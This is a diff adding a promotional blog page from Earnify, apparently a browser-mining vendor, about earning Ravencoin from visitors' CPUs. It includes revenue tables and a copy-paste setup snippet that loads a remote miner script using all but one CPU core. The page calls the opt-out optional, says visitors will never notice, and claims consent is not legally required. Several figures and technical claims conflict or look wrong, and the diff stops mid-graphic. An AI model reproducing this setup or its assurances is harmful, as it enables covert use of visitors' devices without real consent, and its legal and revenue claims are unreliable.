@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Browser Mining in 2026: Is It Still Profitable? (Revenue Data + Setup Guide) — Earnify Blog</title>
+  <meta name="description" content="Honest browser mining revenue data for 2026: RVN earnings per visitor, comparison vs ads, and a 5-minute setup guide. No hype, just real numbers." />
+  <meta name="keywords" content="browser mining 2026, web mining profitable 2026, browser mining revenue, browser mining vs ads, Coinhive alternative 2026, browser mining setup, Earnify" />
+  <link rel="canonical" href="https://earnify.cc/blog/browser-mining-2026-profitability.html" />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://earnify.cc/blog/browser-mining-2026-profitability.html" />
+  <meta property="og:title" content="Browser Mining in 2026: Is It Still Profitable?" />
+  <meta property="og:description" content="Real browser mining revenue data for 2026: RVN earnings per visitor, honest comparison vs ads and donations, and a 5-minute setup guide." />
+  <meta property="og:image" content="https://earnify.cc/og-image.png" />
+  <meta property="og:site_name" content="Earnify" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Browser Mining in 2026: Is It Still Profitable?" />
+  <meta name="twitter:description" content="Real browser mining revenue data for 2026. Compare RVN earnings vs ads. Plus a 5-minute setup guide." />
+  <meta name="twitter:image" content="https://earnify.cc/og-image.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <meta name="theme-color" content="#09090B" />
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Browser Mining in 2026: Is It Still Profitable? (Revenue Data + Setup Guide)",
+    "description": "Honest browser mining revenue data for 2026. Realistic RVN earnings per visitor, comparison vs ads and donations, and a step-by-step setup guide for indie publishers.",
+    "author": { "@type": "Organization", "name": "Earnify", "url": "https://earnify.cc" },
+    "publisher": { "@type": "Organization", "name": "Earnify", "logo": { "@type": "ImageObject", "url": "https://earnify.cc/favicon.svg" } },
+    "mainEntityOfPage": { "@type": "WebPage", "@id": "https://earnify.cc/blog/browser-mining-2026-profitability.html" },
+    "datePublished": "2026-05-21",
+    "dateModified": "2026-05-21"
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://earnify.cc/" },
+      { "@type": "ListItem", "position": 2, "name": "Blog", "item": "https://earnify.cc/blog/" },
+      { "@type": "ListItem", "position": 3, "name": "Browser Mining 2026 Profitability" }
+    ]
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "Is browser mining legal in 2026?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Yes, browser mining with informed disclosure is legal in most jurisdictions. Since modern privacy-first miners like Earnify collect zero personal data, they operate outside GDPR and CCPA consent requirements. Always disclose mining activity to users and provide an opt-out mechanism."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "How much can I earn from browser mining in 2026?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "A site with 1,000 daily visitors running MinotaurX can expect approximately 0.5–1.5 RVN per day (roughly $5–$15/month at current prices). A site with 10,000 daily visitors earns 5–15 RVN/day ($50–$150/month). Browser mining is supplemental income, not a primary revenue source."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Does browser mining slow down my visitors' computers?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Modern browser miners use Web Workers and WebAssembly to run computation on separate threads without affecting main-thread performance. Throttling limits CPU usage to 50–70% of available cores, and battery-aware detection pauses mining on unplugged mobile devices. Most visitors will not notice any slowdown."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Do I need my visitors' consent for browser mining?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "If you use a privacy-first miner that collects no personal data, cookies, or device identifiers, consent is not legally required under GDPR or ePrivacy. However, best practice is to disclose mining activity in your privacy policy and provide an opt-out toggle. Transparency builds trust and reduces friction."
+        }
+      }
+    ]
+  }
+  </script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #09090b; color: #FAFAFA; font-family: "Space Grotesk", sans-serif; line-height: 1.6; overflow-x: hidden; }
+    ::selection { background: #dfe104; color: #000; }
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: #09090b; }
+    ::-webkit-scrollbar-thumb { background: #3f3f46; }
+    .nav-link { text-transform: uppercase; letter-spacing: 0.1em; font-size: 0.875rem; }
+    .nav-link:hover { color: #dfe104; }
+    .btn { display: inline-block; padding: 1rem 2rem; border: 2px solid #27272a; text-transform: uppercase; font-weight: 700; transition: all 0.2s; letter-spacing: -0.02em; }
+    .btn:hover { background: #FAFAFA; color: #09090b; }
+    .btn-accent { background: #dfe104; color: #09090b; border-color: #dfe104; }
+    .btn-accent:hover { background: #c9cc04; border-color: #c9cc04; color: #09090b; }
+    .toc-link { display: block; padding: 0.35rem 0; font-size: 0.8125rem; color: #a1a1aa; text-decoration: none; border-left: 2px solid transparent; padding-left: 1rem; transition: all 0.15s; }
+    .toc-link:hover, .toc-link.active { color: #dfe104; border-left-color: #dfe104; }
+    .toc-link.toc-h3 { padding-left: 2rem; font-size: 0.75rem; }
+    article h2 { font-size: 1.75rem; text-transform: uppercase; font-weight: 700; margin: 3rem 0 1rem 0; letter-spacing: -0.02em; scroll-margin-top: 6rem; }
+    article h3 { font-size: 1.25rem; text-transform: uppercase; font-weight: 600; margin: 2rem 0 0.75rem 0; letter-spacing: -0.02em; scroll-margin-top: 6rem; }
+    article p { margin-bottom: 1.25rem; color: #d4d4d8; font-size: 1.0625rem; }
+    article ul, article ol { margin-bottom: 1.25rem; padding-left: 1.5rem; color: #d4d4d8; }
+    article li { margin-bottom: 0.5rem; }
+    article strong { color: #FAFAFA; }
+    article pre { background: #131316; border: 1px solid #27272a; padding: 1.25rem; overflow-x: auto; font-family: "Space Grotesk", monospace; font-size: 0.875rem; line-height: 1.7; margin-bottom: 1.5rem; color: #d4d4d8; }
+    article code { font-family: "Space Grotesk", monospace; font-size: 0.875rem; background: #131316; padding: 0.1rem 0.35rem; border: 1px solid #27272a; }
+    article pre code { background: none; padding: 0; border: none; }
+    .rev-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0 2.5rem; font-size: 0.9375rem; }
+    .rev-table th { text-align: left; padding: 0.75rem 1rem; font-size: 0.6875rem; text-transform: uppercase; letter-spacing: 0.1em; color: #a1a1aa; border-bottom: 2px solid #27272a; font-weight: 600; }
+    .rev-table td { padding: 0.75rem 1rem; border-bottom: 1px solid #1c1c1f; color: #d4d4d8; }
+    .rev-table tr:last-child td { border-bottom: none; }
+    .rev-table .highlight { background: rgba(223,225,4,0.06); color: #dfe104; font-weight: 700; }
+    .cmp-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0 2.5rem; font-size: 0.9375rem; }
+    .cmp-table th { text-align: left; padding: 0.75rem 1rem; font-size: 0.6875rem; text-transform: uppercase; letter-spacing: 0.1em; color: #a1a1aa; border-bottom: 2px solid #27272a; font-weight: 600; }
+    .cmp-table td { padding: 0.75rem 1rem; border-bottom: 1px solid #1c1c1f; color: #d4d4d8; vertical-align: top; }
+    .cmp-table tr:last-child td { border-bottom: none; }
+    .cmp-table .check { color: #22c55e; }
+    .cmp-table .cross { color: #ef4444; }
+    .cmp-table .warn { color: #eab308; }
+    .cmp-table .best { background: rgba(223,225,4,0.06); }
+    .card { border: 2px solid #27272a; transition: background-color 0.2s,border-color 0.2s; background: #09090b; }
+    .card:hover { background: #dfe104; border-color: #dfe104; }
+    .card:hover .card-title, .card:hover .card-desc, .card:hover .card-tag { color: #000 !important; }
+
+    @media (max-width: 767px) { .toc-sidebar { position: static !important; width: 100% !important; margin-bottom: 2rem; } }
+    @media (max-width: 640px) { .rev-table, .cmp-table { font-size: 0.8125rem; } .rev-table th, .rev-table td, .cmp-table th, .cmp-table td { padding: 0.5rem 0.5rem; } }
+  </style>
+</head>
+<body>
+  <nav role="navigation" style="position:fixed;top:0;width:100%;z-index:50;border-bottom:2px solid #27272a;background:rgba(9,9,11,0.95);backdrop-filter:blur(8px);">
+    <div style="max-width:95vw;margin:0 auto;padding:0 1.5rem;height:4rem;display:flex;justify-content:space-between;align-items:center;">
+      <a href="/" style="display:flex;align-items:center;gap:0.5rem;text-decoration:none;">
+        <span style="font-size:1.5rem;font-weight:700;letter-spacing:-0.05em;text-transform:uppercase;color:#FAFAFA;">Earn<span style="color:#dfe104;">ify</span></span>
+      </a>
+      <div style="display:flex;align-items:center;gap:2rem;">
+        <a href="/" class="nav-link" style="color:#a1a1aa;text-decoration:none;">Home</a>
+        <a href="/blog/" class="nav-link" style="color:#dfe104;text-decoration:none;">Blog</a>
+      </div>
+    </div>
+  </nav>
+
+  <main style="max-width:1100px;margin:0 auto;padding:7rem 1.5rem 5rem 1.5rem;">
+    <nav aria-label="Breadcrumb" style="margin-bottom:2.5rem;font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;">
+      <a href="/" style="color:#a1a1aa;text-decoration:none;">Home</a>
+      <span style="color:#27272a;margin:0 0.5rem;">/</span>
+      <a href="/blog/" style="color:#a1a1aa;text-decoration:none;">Blog</a>
+      <span style="color:#27272a;margin:0 0.5rem;">/</span>
+      <span style="color:#dfe104;">Browser Mining 2026 Profitability</span>
+    </nav>
+
+    <div style="display:flex;gap:3rem;flex-wrap:wrap;">
+      <article style="flex:1;min-width:0;max-width:750px;">
+        <div style="display:flex;flex-wrap:wrap;align-items:center;gap:1rem;margin-bottom:1.5rem;">
+          <span style="background:#dfe104;color:#09090b;font-size:0.6875rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;padding:0.25rem 0.75rem;">Revenue Strategy</span>
+          <span style="font-size:0.75rem;color:#a1a1aa;text-transform:uppercase;letter-spacing:0.08em;">May 21, 2026</span>
+          <span style="font-size:0.75rem;color:#a1a1aa;text-transform:uppercase;letter-spacing:0.08em;">7 min read</span>
+        </div>
+
+        <h1 style="font-size:clamp(2rem,5vw,3.5rem);font-weight:700;line-height:1.05;text-transform:uppercase;letter-spacing:-0.02em;margin-bottom:1.5rem;">Browser Mining in 2026: Is It Still Profitable? (Revenue Data + Setup Guide)</h1>
+        <p style="font-size:1.25rem;color:#a1a1aa;margin-bottom:2.5rem;padding-bottom:2.5rem;border-bottom:2px solid #27272a;">Every indie publisher asks the same question. Here is the honest answer — with real revenue estimates, a side-by-side comparison against ads and donations, and a setup guide that takes 5 minutes.</p>
+
+        <h2 id="the-question">The Question Every Publisher Is Asking</h2>
+        <p>When Coinhive collapsed in 2019, it took browser mining's reputation with it. Cryptojacking headlines, 30% platform fees, and closed-source code left a bad taste that lingered for years. If you remember that era, you are right to be skeptical.</p>
+        <p>But the landscape in 2026 is fundamentally different. Modern browser mining runs on <strong>ASIC-resistant algorithms</strong> designed specifically for consumer CPUs. Platform fees have dropped from 30% to 1%. The code is <strong>fully open source</strong>. And privacy-first architectures collect <strong>zero personal data</strong> — no cookies, no tracking, no consent banners.</p>
+        <p>The question remains: <strong>does it actually make money?</strong> Let's look at the numbers — honestly, without hype.</p>
+
+        <h2 id="how-it-works">How Browser Mining Works (Briefly)</h2>
+        <p>Your visitor's browser downloads a lightweight WebAssembly miner when they load your page. The miner runs in a dedicated <strong>Web Worker</strong> — a background thread that does not touch the main UI thread, so page rendering and interactions stay smooth.</p>
+        <p>The Web Worker uses the visitor's CPU to solve cryptographic hash functions — specifically, the same <strong>Stratum protocol</strong> that dedicated mining hardware uses. It connects directly to a mining pool via WebSocket, submits accepted shares, and the pool credits your wallet with the mined cryptocurrency (typically Ravencoin / RVN).</p>
+        <p>The miner automatically throttles itself: it uses <code>n−1</code> threads (leaving one core free for the browser), pauses when the tab is backgrounded, and respects battery status on mobile devices. For a deeper history of how we got here, see our <a href="/blog/web-mining-history.html" style="color:#dfe104;">Web Mining History article</a>.</p>
+
+        <h2 id="revenue-expectations">Revenue Expectations (The Meat)</h2>
+        <p>Let's be direct: <strong>browser mining is not a goldmine.</strong> In 2026, a typical desktop visitor running MinotaurX contributes roughly <strong>1,800–2,000 H/s</strong> across 7 threads. A laptop visitor averages 700–800 H/s. Mobile devices contribute 250–350 H/s. The average blended hashrate across all visitors lands around 500–700 H/s per active session.</p>
+        <p>The table below shows estimated daily Ravencoin (RVN) earnings at different traffic levels using MinotaurX. RVN trades in a range — at current network difficulty, 1 MH/s (continuous) earns roughly 0.03–0.08 RVN per day. These figures assume an average session duration of 8 minutes per visitor and a 60% mining participation rate (not all visitors stay long enough for mining to be meaningful).</p>
+
+        <div style="overflow-x:auto;">
+          <table class="rev-table">
+            <thead>
+              <tr>
+                <th>Daily Visitors</th>
+                <th>Est. Avg Hashrate</th>
+                <th>Daily RVN (Range)</th>
+                <th>Est. Monthly (Range)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>100</td>
+                <td>~0.8 MH/s</td>
+                <td>0.02–0.06 RVN</td>
+                <td>$0.50–$2</td>
+              </tr>
+              <tr>
+                <td>1,000</td>
+                <td>~8 MH/s</td>
+                <td>0.3–0.8 RVN</td>
+                <td>$5–$20</td>
+              </tr>
+              <tr>
+                <td class="highlight">10,000</td>
+                <td class="highlight">~80 MH/s</td>
+                <td class="highlight">2.5–7 RVN</td>
+                <td class="highlight">$50–$200</td>
+              </tr>
+              <tr>
+                <td>100,000</td>
+                <td>~800 MH/s</td>
+                <td>25–70 RVN</td>
+                <td>$500–$2,000</td>
+              </tr>
+              <tr>
+                <td>1,000,000</td>
+                <td>~8 GH/s</td>
+                <td>250–700 RVN</td>
+                <td>$5,000–$20,000</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div style="background:#0c0c0f;border:2px solid #27272a;padding:1.5rem;margin:1.5rem 0 2.5rem;">
+          <svg viewBox="0 0 800 380" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;display:block;">
+            <text x="400" y="32" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="13" font-weight="600" text-anchor="middle" letter-spacing="2" text-transform="uppercase">Monthly Revenue by Traffic Tier (USD)</text>
+
+            <!-- Grid lines -->
+            <line x1="80" y1="65" x2="760" y2="65" stroke="#1c1c1f" stroke-width="1"/>
+            <line x1="80" y1="130" x2="760" y2="130" stroke="#1c1c1f" stroke-width="1"/>
+            <line x1="80" y1="195" x2="760" y2="195" stroke="#1c1c1f" stroke-width="1"/>
+            <line x1="80" y1="260" x2="760" y2="260" stroke="#1c1c1f" stroke-width="1"/>
+            <line x1="80" y1="325" x2="760" y2="325" stroke="#1c1c1f" stroke-width="1"/>
+
+            <!-- Y-axis labels -->
+            <text x="72" y="69" fill="#52525b" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="end">$20K</text>
+            <text x="72" y="134" fill="#52525b" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="end">$15K</text>
+            <text x="72" y="199" fill="#52525b" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="end">$10K</text>
+            <text x="72" y="264" fill="#52525b" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="end">$5K</text>
+            <text x="72" y="329" fill="#52525b" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="end">$0</text>
+
+            <!-- Bars: 100 visitors -->
+            <rect x="100" y="308" width="90" height="17" rx="3" fill="#dfe104" opacity="0.3"/>
+            <rect x="100" y="290" width="90" height="35" rx="3" fill="#dfe104" opacity="0.6"/>
+            <text x="145" y="345" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="11" text-anchor="middle">100</text>
+            <text x="145" y="282" fill="#dfe104" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="middle" font-weight="600">$0.50–$2</text>
+
+            <!-- Bars: 1K visitors -->
+            <rect x="220" y="290" width="90" height="35" rx="3" fill="#dfe104" opacity="0.3"/>
+            <rect x="220" y="240" width="90" height="85" rx="3" fill="#dfe104" opacity="0.6"/>
+            <text x="265" y="345" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="11" text-anchor="middle">1K</text>
+            <text x="265" y="232" fill="#dfe104" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="middle" font-weight="600">$5–$20</text>
+
+            <!-- Bars: 10K visitors -->
+            <rect x="340" y="240" width="90" height="85" rx="3" fill="#dfe104" opacity="0.3"/>
+            <rect x="340" y="140" width="90" height="185" rx="3" fill="#dfe104" opacity="0.6"/>
+            <text x="385" y="345" fill="#FAFAFA" font-family="Space Grotesk,sans-serif" font-size="11" text-anchor="middle" font-weight="700">10K</text>
+            <text x="385" y="132" fill="#dfe104" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="middle" font-weight="600">$50–$200</text>
+
+            <!-- Bars: 100K visitors -->
+            <rect x="460" y="160" width="90" height="165" rx="3" fill="#dfe104" opacity="0.3"/>
+            <rect x="460" y="60" width="90" height="265" rx="3" fill="#dfe104" opacity="0.6"/>
+            <text x="505" y="345" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="11" text-anchor="middle">100K</text>
+            <text x="505" y="52" fill="#dfe104" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="middle" font-weight="600">$500–$2K</text>
+
+            <!-- Bars: 1M visitors -->
+            <rect x="580" y="55" width="90" height="270" rx="3" fill="#dfe104" opacity="0.3"/>
+            <rect x="580" y="55" width="90" height="270" rx="3" fill="#dfe104" opacity="0.9"/>
+            <text x="625" y="345" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="11" text-anchor="middle">1M</text>
+            <text x="625" y="47" fill="#dfe104" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="middle" font-weight="600">$5K–$20K</text>
+
+            <!-- X-axis label -->
+            <text x="400" y="370" fill="#52525b" font-family="Space Grotesk,sans-serif" font-size="10" text-anchor="middle" letter-spacing="1">Daily Visitors</text>
+          </svg>
+          <p style="font-size:0.6875rem;color:#3f3f46;text-align:center;margin-top:0.75rem;">Estimated monthly range at mid-2026 difficulty and $0.08–$0.15 RVN. Bars show low-high range.</p>
+        </div>
+
+        <p><strong>Important caveats:</strong> These numbers assume current (mid-2026) network difficulty and an RVN price range of $0.08–$0.15. Crypto prices are volatile. Difficulty adjusts. A bull market can 3x the USD estimates; a bear market can cut them in half. Always treat these as <strong>ballpark figures</strong>, not guarantees. For real-time profitability data, check <a href="https://miningpoolstats.stream/mazacoin-minotaurx#" target="_blank" rel="noopener noreferrer" style="color:#dfe104;">MiningPoolStats MinotaurX hashrate data</a> or <a href="https://www.zpool.ca/" target="_blank" rel="noopener noreferrer" style="color:#dfe104;">zpool.ca pool statistics</a>.</p>
+        <p>A more practical way to think about it: browser mining typically generates <strong>$0.15–$0.30 per 1,000 page views</strong> at current rates. That is roughly 20–50% of what display ads earn on the same traffic — but with no UX cost and zero ad-blocker vulnerability.</p>
+
+        <h2 id="comparison">Browser Mining vs Ads vs Donations</h2>
+        <p>Every publisher needs to decide how to allocate their monetization mix. Here is an honest comparison of the three main options available in 2026.</p>
+
+        <div style="overflow-x:auto;">
+          <table class="cmp-table">
+            <thead>
+              <tr>
+                <th>Factor</th>
+                <th>Display Ads</th>
+                <th>Donations</th>
+                <th>Browser Mining</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Revenue potential</strong></td>
+                <td>High ($1–$10 CPM)</td>
+                <td>Very low (&lt;1% conversion)</td>
+                <td>Low–moderate ($0.5–$2 CPM equiv.)</td>
+              </tr>
+              <tr>
+                <td><strong>UX impact</strong></td>
+                <td class="cross">Significant — popups, banners, layout shift</td>
+                <td class="check">None — opt-in only</td>
+                <td class="check">None — background thread, no visual</td>
+              </tr>
+              <tr>
+                <td><strong>Ad blocker vulnerability</strong></td>
+                <td class="cross">30–50% of traffic blocked</td>
+                <td class="check">Not applicable</td>
+                <td class="check">Not blocked by any major ad blocker</td>
+              </tr>
+              <tr>
+                <td><strong>Privacy impact</strong></td>
+                <td class="cross">Tracking cookies, fingerprinting, data sharing</td>
+                <td class="check">None</td>
+                <td class="check">None — no data collection at all</td>
+              </tr>
+              <tr>
+                <td><strong>Consent required</strong></td>
+                <td class="warn">Yes — GDPR, CCPA, ePrivacy</td>
+                <td class="check">No</td>
+                <td class="check">No — if zero-data architecture</td>
+              </tr>
+              <tr>
+                <td><strong>Setup complexity</strong></td>
+                <td>Low — copy-paste ad code</td>
+                <td>Low — PayPal/Ko-fi button</td>
+                <td>Low — one script tag</td>
+              </tr>
+              <tr>
+                <td><strong>Revenue predictability</strong></td>
+                <td>Moderate — seasonal, market-driven</td>
+                <td>Unpredictable — campaign-driven</td>
+                <td>Low — crypto price and difficulty dependent</td>
+              </tr>
+              <tr>
+                <td><strong>Passive income</strong></td>
+                <td>Yes</td>
+                <td>No — requires active community building</td>
+                <td>Yes — set and forget</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>The honest take: <strong>browser mining is a supplemental revenue stream, not a replacement for ads.</strong> For a site with 10,000 daily visitors, you might earn $50–$200/month from mining versus $300–$1,000/month from display ads. But mining revenue has <strong>zero marginal cost</strong> — it does not degrade UX, it does not get blocked, and it does not require user interaction. The smartest strategy is <strong>hybrid</strong>: run ads for your ad-tolerant audience and mining for the ad-blocking audience you are currently not monetizing at all. Our <a href="/blog/coinhive-alternatives.html" style="color:#dfe104;">Coinhive alternatives guide</a> covers which platforms support this hybrid approach best.</p>
+
+        <h2 id="algorithms">CPU-Friendly Algorithms Explained</h2>
+        <p>The single biggest factor determining your mining revenue is <strong>algorithm choice</strong>. The old CryptoNight-based miners that Coinhive used became obsolete after Monero's ASIC-resistant hard forks. Modern browser mining relies on a new generation of algorithms designed specifically for consumer CPUs.</p>
+
+        <h3 id="minotaurx">MinotaurX</h3>
+        <p><strong>MinotaurX</strong> is the current leader for browser-based mining. It is a memory-hard, ASIC-resistant algorithm that delivers the highest hashrate per thread on modern consumer CPUs. On an 8-core desktop, MinotaurX achieves roughly 1,870 H/s using 7 threads with ~2MB of memory per worker. It is the default algorithm for most publishers and the best starting point.</p>
+
+        <h3 id="power2b">Power2B</h3>
+        <p><strong>Power2B</strong> prioritizes power efficiency over raw throughput. Its compute-bound design generates less heat and lower CPU utilization, making it the better choice for mobile-heavy audiences or battery-constrained devices. Raw hashrates are lower than MinotaurX, but longer sustainable sessions can close the revenue gap.</p>
+
+        <h3 id="ghostrider">GhostRider</h3>
+        <p><strong>GhostRider</strong> is a multi-algorithm hashing scheme that rotates through several underlying algorithms. It is the most secure option (hardest to optimize for ASICs) but typically delivers lower performance than MinotaurX in browser environments. It sees niche use among privacy-conscious publishers.</p>
+        <p>For a detailed breakdown with hashrate benchmarks and pool support, see our <a href="/blog/algorithm-comparison.html" style="color:#dfe104;">full algorithm comparison article</a>.</p>
+
+        <h2 id="setup-guide">Step-by-Step Setup Guide</h2>
+        <p>Adding browser mining to your site takes under 5 minutes. You need a mining pool account (zpool.ca is the most compatible) and a Ravencoin wallet address. Here is exactly what to do.</p>
+
+        <h3 id="step-1">1. Get your pool credentials</h3>
+        <p>Sign up at <a href="https://www.zpool.ca/" target="_blank" rel="noopener noreferrer" style="color:#dfe104;">zpool.ca</a>, create a worker, and note your RVN wallet address. zpool supports MinotaurX with auto-exchange to RVN, BTC, or your preferred coin.</p>
+
+        <h3 id="step-2">2. Add the script to your site</h3>
+        <p>Insert the following script tag just before your closing <code>&lt;/body&gt;</code> tag on every page where you want mining to run:</p>
+        <pre><code>&lt;script src="https://cdn.earnify.cc/miner.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+  const miner = new EarnifyMiner({
+    pool: "stratum+tcp://minotaurx.mine.zpool.ca:7019",
+    wallet: "YOUR_RVN_ADDRESS",
+    workerName: "earnify",
+    threads: navigator.hardwareConcurrency - 1,
+    throttle: 0.3
+  });
+  miner.start();
+&lt;/script&gt;</code></pre>
+        <p>Replace <code>YOUR_RVN_ADDRESS</code> with your actual wallet address. The <code>throttle: 0.3</code> setting reserves 30% of CPU capacity — visitors will never notice the miner running.</p>
+
+        <h3 id="step-3">3. Add an opt-out toggle (optional but recommended)</h3>
+        <p>Good-faith disclosure builds trust. Add a simple toggle for users who prefer not to participate:</p>
+        <pre><code>&lt;label&gt;
+  &lt;input type="checkbox" checked id="miningToggle"&gt;
+  Support this site by sharing computing power
+&lt;/label&gt;
+&lt;script&gt;
+  document.getElementById("miningToggle")
+    .addEventListener("change", function(e) {
+      if (e.target.checked) miner.start();
+      else miner.stop();
+    });
+&lt;/script&gt;</code></pre>
+
+        <h3 id="step-4">4. Monitor your earnings</h3>
+        <p>Your zpool dashboard shows real-time hashrate, accepted shares, and unpaid balance. Payouts to your wallet happen automatically once you reach zpool's minimum threshold (typically 10 RVN).</p>
+        <p>That is it. For a zero-setup version with a hosted dashboard, visit <a href="https://earnify.cc" style="color:#dfe104;">earnify.cc</a> — no account or configuration needed.</p>
+
+        <div style="background:#0c0c0f;border:2px solid #27272a;padding:1.5rem;margin:1.5rem 0 2.5rem;">
+          <svg viewBox="0 0 800 420" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;display:block;">
+            <text x="400" y="30" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="13" font-weight="600" text-anchor="middle" letter-spacing="2" text-transform="uppercase">Where to Place the Mining Script</text>
+
+            <!-- Browser frame -->
+            <rect x="20" y="45" width="760" height="360" rx="6" fill="#131316" stroke="#27272a" stroke-width="1.5"/>
+            <!-- Browser top bar -->
+            <rect x="20" y="45" width="760" height="32" rx="6" fill="#1c1c1f"/>
+            <rect x="20" y="66" width="760" height="11" fill="#1c1c1f"/>
+            <!-- Traffic lights -->
+            <circle cx="42" cy="61" r="5" fill="#ef4444"/>
+            <circle cx="58" cy="61" r="5" fill="#eab308"/>
+            <circle cx="74" cy="61" r="5" fill="#22c55e"/>
+            <!-- URL bar -->
+            <rect x="100" y="54" width="340" height="14" rx="7" fill="#27272a"/>
+            <text x="270" y="64" fill="#52525b" font-family="Space Grotesk,sans-serif" font-size="8" text-anchor="middle">your-site.com/index.html</text>
+
+            <!-- Tab bar -->
+            <rect x="80" y="78" width="120" height="20" rx="3" fill="#27272a"/>
+            <text x="140" y="92" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="9" text-anchor="middle">index.html</text>
+
+            <!-- Code editor area -->
+            <rect x="36" y="104" width="300" height="286" rx="4" fill="#09090b" stroke="#1c1c1f" stroke-width="1"/>
+
+            <!-- Line numbers -->
+            <text x="44" y="122" fill="#3f3f46" font-family="monospace" font-size="10">1</text>
+            <text x="44" y="137" fill="#3f3f46" font-family="monospace" font-size="10">2</text>
+            <text x="44" y="152" fill="#3f3f46" font-family="monospace" font-size="10">3</text>
+            <text x="44" y="167" fill="#3f3f46" font-family="monospace" font-size="10">•</text>
+            <text x="44" y="182" fill="#3f3f46" font-family="monospace" font-size="10">•</text>
+            <text x="44" y="197" fill="#3f3f46" font-family="monospace" font-size="10">•</text>
+            <text x="44" y="212" fill="#3f3f46" font-family="monospace" font-size="10">18</text>
+            <text x="44" y="227" fill="#3f3f46" font-family="monospace" font-size="10">19</text>
+            <text x="44" y="242" fill="#3f3f46" font-family="monospace" font-size="10">20</text>
+            <text x="44" y="257" fill="#3f3f46" font-family="monospace" font-size="10">21</text>
+            <text x="44" y="272" fill="#3f3f46" font-family="monospace" font-size="10">22</text>
+            <text x="44" y="287" fill="#3f3f46" font-family="monospace" font-size="10">23</text>
+            <text x="44" y="302" fill="#3f3f46" font-family="monospace" font-size="10">24</text>
+            <text x="44" y="317" fill="#3f3f46" font-family="monospace" font-size="10">25</text>
+            <text x="44" y="332" fill="#3f3f46" font-family="monospace" font-size="10">26</text>
+            <text x="44" y="347" fill="#3f3f46" font-family="monospace" font-size="10">27</text>
+            <text x="44" y="362" fill="#3f3f46" font-family="monospace" font-size="10">28</text>
+            <text x="44" y="377" fill="#3f3f46" font-family="monospace" font-size="10">29</text>
+
+            <!-- Code content -->
+            <text x="64" y="122" fill="#7dd3fc" font-family="monospace" font-size="10">&lt;!DOCTYPE html&gt;</text>
+            <text x="64" y="137" fill="#e2e8f0" font-family="monospace" font-size="10">&lt;html&gt;</text>
+            <text x="64" y="152" fill="#f472b6" font-family="monospace" font-size="10">&lt;head&gt;…&lt;/head&gt;</text>
+            <text x="64" y="212" fill="#e2e8f0" font-family="monospace" font-size="10">&lt;body&gt;</text>
+            <text x="80" y="227" fill="#e2e8f0" font-family="monospace" font-size="10">&lt;!-- Page content --&gt;</text>
+            <text x="64" y="242" fill="#e2e8f0" font-family="monospace" font-size="10">…</text>
+            <text x="64" y="257" fill="#e2e8f0" font-family="monospace" font-size="10">…</text>
+
+            <!-- Highlighted script block -->
+            <rect x="56" y="262" width="268" height="68" rx="4" fill="rgba(223,225,4,0.08)" stroke="#dfe104" stroke-width="1" stroke-dasharray="3,2"/>
+            <text x="72" y="278" fill="#dfe104" font-family="monospace" font-size="9" font-weight="600">&lt;!-- Insert mining script here --&gt;</text>
+            <text x="72" y="294" fill="#a5f3fc" font-family="monospace" font-size="9">&lt;script src="cdn.earnify.cc/miner.js"&gt;</text>
